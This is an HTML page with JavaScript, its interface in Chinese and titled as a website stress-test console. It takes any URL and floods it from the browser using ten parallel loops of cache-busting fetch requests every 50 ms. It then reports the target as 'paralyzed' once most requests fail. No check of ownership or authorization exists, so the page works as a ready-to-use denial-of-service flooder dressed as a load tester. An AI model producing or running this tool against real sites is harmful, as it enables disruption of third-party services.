<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>網站壓力測試控制台</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a1a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2d2d2d;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 500px;
            text-align: center;
        }
        h1 { margin-bottom: 20px; font-size: 24px; color: #ff4757; }
        input[type="url"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 2px solid #444;
            border-radius: 6px;
            background-color: #3d3d3d;
            color: white;
            box-sizing: border-box;
            font-size: 16px;
        }
        input[type="url"]:focus { border-color: #ff4757; outline: none; }
        .btn-group { display: flex; gap: 15px; justify-content: center; }
        button {
            padding: 12px 28px;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
        }
        #startBtn { background-color: #2ed573; color: white; }
        #startBtn:hover { background-color: #26af5f; }
        #startBtn:disabled { background-color: #555; cursor: not-allowed; }
        #stopBtn { background-color: #ff4757; color: white; }
        #stopBtn:hover { background-color: #e04050; }
        #stopBtn:disabled { background-color: #555; cursor: not-allowed; }
        .status-panel {
            margin-top: 25px;
            padding: 15px;
            background-color: #1e1e1e;
            border-radius: 6px;
            text-align: left;
            font-family: monospace;
        }
        .status-item { margin: 8px 0; font-size: 14px; }
        .badge {
            padding: 3px 8px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 12px;
        }
        .badge-ready { background-color: #747d8c; }
        .badge-running { background-color: #2ed573; animation: blink 1s infinite; }
        .badge-stopped { background-color: #ff4757; }
        @keyframes blink { 50% { opacity: 0.5; } }
    </style>
</head>
<body>

<div class="container">
    <h1>🌐 網站壓力測試控制台</h1>
    <input type="url" id="targetUrl" placeholder="請輸入欲測試的完整連結 (例如: https://example.com)" required>
    
    <div class="btn-group">
        <button id="startBtn">🚀 開始測試</button>
        <button id="stopBtn" disabled>🛑 停止測試</button>
    </div>

    <div class="status-panel">
        <div class="status-item">目前狀態: <span id="statusBadge" class="badge badge-ready">準備就緒</span></div>
        <div class="status-item">已發送請求數: <span id="requestCount" style="color: #eccc68;">0</span> 次</div>
        <div class="status-item">成功回應數: <span id="successCount" style="color: #2ed573;">0</span></div>
        <div class="status-item">失敗/卡死數: <span id="failCount" style="color: #ff4757;">0</span></div>
        <div class="status-item" id="reportLog" style="color: #a4b0be; margin-top: 10px; border-top: 1px solid #444; padding-top: 10px;">
            報告: 等待測試開始...
        </div>
    </div>
</div>

<script>
    let isTesting = false;
    let requestCount = 0;
    let successCount = 0;
    let failCount = 0;
    let testIntervals = [];

    const targetUrlInput = document.getElementById('targetUrl');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const statusBadge = document.getElementById('statusBadge');
    const requestCountEl = document.getElementById('requestCount');
    const successCountEl = document.getElementById('successCount');
    const failCountEl = document.getElementById('failCount');
    const reportLog = document.getElementById('reportLog');

    // 點擊開始測試
    startBtn.addEventListener('click', () => {
        let url = targetUrlInput.value.trim();
        if (!url) {
            alert('請先輸入網址！');
            return;
        }
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
            url = 'https://' + url;
            targetUrlInput.value = url;
        }

        // 初始化狀態
        isTesting = true;
        requestCount = 0;
        successCount = 0;
        failCount = 0;
        testIntervals = [];
        
        updateUI('running');
        reportLog.innerText = "正在全力發送請求中，觀察目標伺服器反應...";

        // 啟動多個並行循環，加強壓測力道
        const concurrency = 10; // 並行軌道數
        for (let i = 0; i < concurrency; i++) {
            let interval = setInterval(() => {
                if (!isTesting) return;
                sendPayload(url);
            }, 50); // 每 50 毫秒發送一次
            testIntervals.push(interval);
        }
    });

    // 點擊停止測試
    stopBtn.addEventListener('click', () => {
        stopTesting();
        reportLog.innerHTML = `<strong>測試終止報告：</strong><br>最終共發送了 ${requestCount} 次請求。<br>目標網站卡死/無回應次數：${failCount} 次。<br>狀態：已手動攔截暫停。`;
    });

    function stopTesting() {
        isTesting = false;
        testIntervals.forEach(clearInterval);
        testIntervals = [];
        updateUI('stopped');
    }

    // 發送壓測請求的主核心
    function sendPayload(url) {
        requestCount++;
        requestCountEl.innerText = requestCount;

        // 加上隨機參數防止瀏覽器快取 (Cache)，確保每次都直達伺服器
        const randUrl = url + (url.includes('?') ? '&' : '?') + 'td=' + Date.now() + Math.random();

        // 建立超時機制，如果 3 秒內沒回應就判定為卡死/失敗
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);

        fetch(randUrl, { mode: 'no-cors', signal: controller.signal })
            .then(() => {
                clearTimeout(timeoutId);
                successCount++;
                successCountEl.innerText = successCount;
            })
            .catch((err) => {
                clearTimeout(timeoutId);
                failCount++;
                failCountEl.innerText = failCount;
                
                // 自動偵測：如果失敗/卡死比例過高，回報網站可能已癱瘓
                if (failCount > 20 && (failCount / requestCount) > 0.6) {
                    reportLog.innerHTML = `<span style="color: #ff4757; font-weight:bold;">⚠️ 警報：目標網站疑似已陷入卡死/癱瘓狀態！</span><br>失敗率已高達 ${Math.round((failCount/requestCount)*100)}%`;
                }
            });
    }

    function updateUI(state) {
        if (state === 'running') {
            startBtn.disabled = true;
            stopBtn.disabled = false;
            targetUrlInput.disabled = true;
            statusBadge.innerText = '測試中';
            statusBadge.className = 'badge badge-running';
        } else if (state === 'stopped') {
            startBtn.disabled = false;
            stopBtn.disabled = true;
            targetUrlInput.disabled = false;
            statusBadge.innerText = '已停止';
            statusBadge.className = 'badge badge-stopped';
        }
    }
</script>

</body>
</html>
